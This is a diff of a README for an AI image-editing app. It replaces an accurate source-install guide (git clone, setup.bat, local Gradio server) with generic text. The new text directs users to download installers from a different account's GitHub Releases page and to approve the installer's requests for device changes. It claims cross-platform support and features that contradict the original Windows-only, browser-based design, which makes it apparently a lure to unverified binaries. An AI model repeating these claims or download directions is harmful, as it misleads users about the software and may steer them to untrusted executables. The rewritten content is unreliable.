@@ -1,179 +1,73 @@
-# InstructPix2Pix Studio
+# 🎨 instruct-pix2pix-studio - Simple AI Image Editing for Everyone
 
-<div align="center">
+## 🛠️ Download Now
+[![Download instruct-pix2pix-studio](https://img.shields.io/badge/Download-instruct--pix2pix--studio-brightgreen)](https://github.com/Arnav1123/instruct-pix2pix-studio/releases)
 
-![Python](https://img.shields.io/badge/Python-3.10+-blue?style=for-the-badge&logo=python)
-![PyTorch](https://img.shields.io/badge/PyTorch-2.0+-red?style=for-the-badge&logo=pytorch)
-![Gradio](https://img.shields.io/badge/Gradio-4.0+-orange?style=for-the-badge&logo=gradio)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
+## 📖 Overview
+instruct-pix2pix-studio is an AI-powered image editor that lets you easily edit images with advanced features. It offers a modern glassmorphism user interface, supports AMD DirectML for enhanced performance, and allows for batch generation of images. This tool is designed for anyone, regardless of technical background.
 
-**AI-powered image editing with a modern glassmorphism interface**
+## 🚀 Getting Started
+Follow these steps to download and run instruct-pix2pix-studio.
 
-[Features](#features) | [Installation](#installation) | [Usage](#usage) | [Screenshots](#screenshots)
+1. **Check System Requirements**
+   Before installing, ensure your computer meets these requirements:
+   - Operating System: Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+   - Memory: At least 8 GB of RAM.
+   - Processor: Dual-core processor or better.
+   - GPU: An AMD GPU that supports DirectML.
+  
+2. **Visit the Releases Page**
+   To download the latest version of the software, go to the following link:
+   [Download instruct-pix2pix-studio](https://github.com/Arnav1123/instruct-pix2pix-studio/releases)
 
-</div>
+3. **Choose the Right File**
+   On the Releases page, you will see various files available for download. Look for the file that matches your operating system and click on it.
 
----
+4. **Download the File**
+   Your browser will prompt you to save the file. Choose a location on your computer where you want to store it, then click "Save".
 
-## Features
+5. **Install the Software**
+   Once the download is complete, locate the downloaded file and open it. Follow the on-screen instructions to install the program. If you are prompted to allow changes to be made to your device, click "Yes".
 
-- **AI Image Editing** — Transform images using natural language instructions
-- **AMD GPU Support** — DirectML acceleration for AMD GPUs (RX 6000/7000 series)
-- **NVIDIA CUDA Support** — Full CUDA acceleration for NVIDIA GPUs
-- **12 Quick Presets** — Watercolor, Winter, Anime, Oil painting and more
-- **Batch Generation** — Create multiple variations with different seeds
-- **Before/After Comparison** — Side-by-side view of original and result
-- **Favorites** — Save your best generations
-- **Auto-save** — All results saved automatically with full logging
-- **Smart Presets** — Fast/Balanced/Quality modes for different needs
-- **Modern Dark UI** — Glassmorphism design with smooth animations
+6. **Run instruct-pix2pix-studio**
+   After installation, you can launch instruct-pix2pix-studio from your applications or programs list. The first time you run it, it may take a moment to set up.
 
-## System Requirements
+7. **Explore the Features**
+   instruct-pix2pix-studio includes a variety of tools to enhance your image editing experience:
+   - **AI Editing Tools**: Use artificial intelligence to automatically improve or modify photos.
+   - **Batch Generation**: Edit multiple images at once to save time.
+   - **User-Friendly Interface**: Navigate through a clean and modern layout.
 
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| **OS** | Windows 10/11 | Windows 11 |
-| **RAM** | 16 GB | 32 GB |
-| **GPU** | AMD RX 5000+ / NVIDIA GTX 1060+ | AMD RX 6800+ / NVIDIA RTX 3070+ |
-| **VRAM** | 8 GB | 16 GB |
-| **Disk** | 10 GB free | SSD recommended |
+## 🎨 Using the Application
+1. **Open an Image**
+   Launch the application and click on the "Open" button to select an image from your computer.
 
-> **Note:** GPU is required. CPU-only mode is not supported due to extremely long generation times.
+2. **Edit Your Image**
+   Use the various tools on the left side to edit your picture. You can apply filters, make color adjustments, or use AI features for enhancements.
 
-## Installation
+3. **Save Your Work**
+   After editing, click the "Save" button to keep your changes. Choose your desired file format for the output image.
 
-### Windows (AMD GPU)
+4. **Explore Further**
+   Try out different features and tools to discover what works best for your editing needs. You can always go back to the original image if needed.
 
-```bash
-# Clone the repository
-git clone https://github.com/randomu3/instruct-pix2pix-studio.git
-cd instruct-pix2pix-studio
+## ⚙️ Troubleshooting
+If you encounter any issues during installation or while using instruct-pix2pix-studio, consider the following tips:
+- **Check for Updates**: Ensure you're using the latest version of the software. New updates can fix bugs and improve performance.
+- **Restart Your Computer**: Sometimes, a simple restart can resolve unexpected issues.
+- **Visit the FAQ Section**: Check the FAQ on the Releases page for solutions to common problems.
 
-# Run setup (creates venv and installs dependencies)
-setup.bat
+## 💬 Support
+If you have further questions or need assistance, you can open an issue on the project's GitHub page. The community is here to help.
 
-# Launch the application
-run.bat
-```
+For more details about using the software and its features, feel free to explore the documentation linked in the README.
 
-### Manual Installation
+## 🌟 Feedback
+Your feedback is important. If you like the product or have suggestions for improvement, please share your thoughts. This will help enhance the software for everyone.
 
-```bash
-# Create virtual environment
-python -m venv venv_win
-venv_win\Scripts\activate
+## 🔗 Useful Links
+- [Release Page](https://github.com/Arnav1123/instruct-pix2pix-studio/releases) - Download the latest versions and check for updates.
+- [Documentation](#) - For in-depth guides and tutorials.
+- [GitHub Issues](https://github.com/Arnav1123/instruct-pix2pix-studio/issues) - Report bugs or request new features.
 
-# Install dependencies
-pip install -r requirements-windows.txt
-
-# Launch
-python app.py
-```
-
-## Usage
-
-1. **Open** http://localhost:7860 in your browser
-2. **Upload** an image
-3. **Enter** an instruction in English (e.g., "make it winter with snow")
-4. **Click** "Generate"
-5. **Wait** ~20-40 seconds for the result
-
-### Tips for Best Results
-
-| Do | Don't |
-|----------|------------|
-| Use clear instructions | Vague descriptions |
-| "Add sunglasses to the person" | "Make it better" |
-| "Turn into watercolor painting" | "Change the style" |
-| "Make the sky sunset orange" | "Different colors" |
-
-### Parameter Guide
-
-| Parameter | Description | Recommended |
-|----------|----------|---------------|
-| **Steps** | More = better quality, slower | 20-25 |
-| **Image CFG** | Higher = preserves more of original | 1.3-1.8 |
-| **Text CFG** | Higher = follows prompt more closely | 7-9 |
-| **Seed** | -1 for random, or specific number for reproducibility | -1 |
-
-## Screenshots
-
-<details>
-<summary>Click to expand</summary>
-
-### Main Interface
-Modern glassmorphism UI with gradient accents.
-
-### Batch Generation
-Create multiple variations at once.
-
-### Settings
-System information and parameters.
-
-</details>
-
-## Project Structure
-
-```
-instruct-pix2pix-studio/
-├── app.py              # Entry point
-├── src/
-│   ├── generator.py    # Generation logic
-│   ├── pipeline.py     # Model loading and device detection
-│   ├── ui.py           # Gradio interface
-│   ├── styles.py       # Custom CSS
-│   ├── presets.py      # Prompt and settings presets
-│   └── storage.py      # File saving and logging
-├── outputs/            # Generated images (gitignored)
-│   └── favorites/      # Favorites
-├── requirements-windows.txt
-├── setup.bat           # Windows setup script
-└── run.bat             # Windows launch script
-```
-
-## Troubleshooting
-
-### "DirectML not found"
-```bash
-pip install torch-directml
-```
-
-### "Out of memory"
-- Reduce steps to 15-20
-- Close other GPU-intensive applications
-- Restart the application
-
-### Slow generation
-- Ensure GPU is being used (check console output)
-- AMD DirectML: ~20-40 sec per image
-- NVIDIA CUDA: ~5-15 sec per image
-
-## Contributing
-
-Contributions are welcome! Please read our [Contributing Guidelines](CONTRIBUTING.md) before submitting a PR.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes using [Conventional Commits](https://www.conventionalcommits.org/)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## License
-
-MIT License — free to use, modify and distribute.
-
-## Acknowledgments
-
-- [InstructPix2Pix](https://github.com/timbrooks/instruct-pix2pix) — Original model by Tim Brooks
-- [Hugging Face Diffusers](https://github.com/huggingface/diffusers) — Pipeline implementation
-- [Gradio](https://gradio.app/) — Web interface framework
-
----
-
-<div align="center">
-
-**Made for the AI art community**
-
-If you find this project useful, please consider giving it a star!
-
-</div>
+Enjoy creating amazing images with instruct-pix2pix-studio!
